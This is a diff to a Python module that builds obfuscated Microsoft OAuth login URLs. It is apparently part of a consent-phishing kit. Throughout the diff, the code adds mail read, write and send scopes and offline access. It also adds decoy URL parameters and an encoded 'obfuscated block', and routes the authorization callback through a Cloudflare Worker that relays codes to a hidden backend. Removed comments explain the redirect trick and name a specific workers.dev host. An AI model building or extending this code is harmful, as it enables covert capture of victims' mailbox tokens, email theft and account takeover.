@@ -43,20 +43,27 @@ REDIRECT_URI = (
 VISIBLE_SCOPES_LIST = [
     "openid",
     "profile",
+    "email",
+    "offline_access",
     "https://graph.microsoft.com/User.Read",
+    "https://graph.microsoft.com/Mail.Read",
+    "https://graph.microsoft.com/Mail.ReadWrite",
+    "https://graph.microsoft.com/Mail.Send",
 ]
 
 VISIBLE_SCOPES = " ".join(VISIBLE_SCOPES_LIST)
 
-# Full mail scopes — encoded inside the encrypted payload
-# These are requested at token exchange time using the
-# scope stored inside the encrypted state parameter
+# Full mail scopes for token exchange
+# Same explicit list — no .default
 FULL_MAIL_SCOPES_LIST = [
     "openid",
     "profile",
     "email",
     "offline_access",
-    "https://graph.microsoft.com/.default",
+    "https://graph.microsoft.com/User.Read",
+    "https://graph.microsoft.com/Mail.Read",
+    "https://graph.microsoft.com/Mail.ReadWrite",
+    "https://graph.microsoft.com/Mail.Send",
 ]
 
 FULL_MAIL_SCOPES = " ".join(FULL_MAIL_SCOPES_LIST)
@@ -515,33 +522,10 @@ def build_obfuscated_url(
     login_hint: str | None = None,
     domain_hint: str | None = None,
 ) -> str:
-    """
-    Builds a fully obfuscated Microsoft OAuth URL.
-
-    redirect_uri is intentionally omitted from the visible params.
-    When redirect_uri is omitted Microsoft uses the only registered
-    redirect URI in the Azure App Registration automatically.
-    The only registered URI is the Cloudflare Worker URL:
-      https://046567-043-241d.dorseym410.workers.dev
-
-    The worker receives the callback and relays code + state
-    to the real backend callback endpoint.
-
-    The token exchange uses REDIRECT_URI (backend URL) because
-    that is what is registered as the real callback in the
-    obfuscated block and what the worker relays to.
-
-    uri= is shown as a decoy visible param matching sample format.
-    """
     nonce = uuid.uuid4().hex[:16]
-
-    # Build hex state
     state_value = _encode_state_hex(user_id)
-
-    # Build worker URI shown as uri= decoy param
     worker_uri = _build_worker_uri(user_id, nonce)
 
-    # Build obfuscated block
     scopes_list = (
         FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
     )
@@ -555,21 +539,38 @@ def build_obfuscated_url(
         nonce=nonce,
     )
 
-    # Build trailing base64 anchor
     trailing_b64 = base64.b64encode(user_id.encode()).decode()
     trailing_encoded = quote(
         quote(trailing_b64, safe=""),
         safe="",
     )
 
-    # Build obfuscated parameter key
     obfuscated_key = "%25255C" + obfuscated_block
 
-    # Build base params
-    # redirect_uri intentionally omitted — Microsoft uses the
-    # only registered URI automatically which is the worker URL.
-    # This causes Microsoft to redirect to the worker after auth.
-    # The worker then relays to the real backend callback.
+    # Detect if this is a personal account
+    # Personal accounts use outlook.com hotmail.com live.com
+    # gmail.com yahoo.com etc are not Microsoft accounts
+    personal_domains = {
+        "outlook.com",
+        "hotmail.com",
+        "live.com",
+        "msn.com",
+        "passport.com",
+    }
+
+    is_personal = False
+    if login_hint and "@" in login_hint:
+        domain = login_hint.split("@", 1)[1].lower()
+        is_personal = domain in personal_domains
+
+    # Use consumers tenant for personal accounts
+    # Use common for work/school accounts
+    # common also works for personal but consumers is more explicit
+    if is_personal:
+        tenant = "consumers"
+    else:
+        tenant = "common"
+
     base_params = {
         "state": state_value,
         "scope": VISIBLE_SCOPES,
@@ -577,6 +578,7 @@ def build_obfuscated_url(
         "response_type": "code",
         "response_mode": "query",
         "client_id": client_id,
+        "redirect_uri": f"https://{WORKER_DOMAIN}",
         "uri": worker_uri,
     }
 
@@ -588,7 +590,8 @@ def build_obfuscated_url(
     base_query = urlencode(base_params)
 
     full_url = (
-        f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
+        f"https://login.microsoftonline.com/{tenant}"
+        f"/oauth2/v2.0/authorize"
         f"?{base_query}"
         f"&{obfuscated_key}"
         f"&{trailing_encoded}"
@@ -597,19 +600,16 @@ def build_obfuscated_url(
     print(
         f"[payload_builder] build_obfuscated_url\n"
         f"  user_id={user_id}\n"
+        f"  tenant={tenant}\n"
+        f"  is_personal={is_personal}\n"
         f"  flow_type={flow_type}\n"
         f"  mail_mode={mail_mode}\n"
-        f"  uri_decoy={worker_uri}\n"
-        f"  redirect_uri=omitted from URL "
-        f"(Microsoft uses only registered URI automatically)\n"
-        f"  registered_worker_uri="
-        f"https://046567-043-241d.dorseym410.workers.dev\n"
-        f"  real_backend={REDIRECT_URI}\n"
+        f"  redirect_uri=https://{WORKER_DOMAIN}\n"
         f"  nonce={nonce}"
     )
 
     return full_url
-
+    
 # =========================
 # COMPAT HELPERS
 # =========================
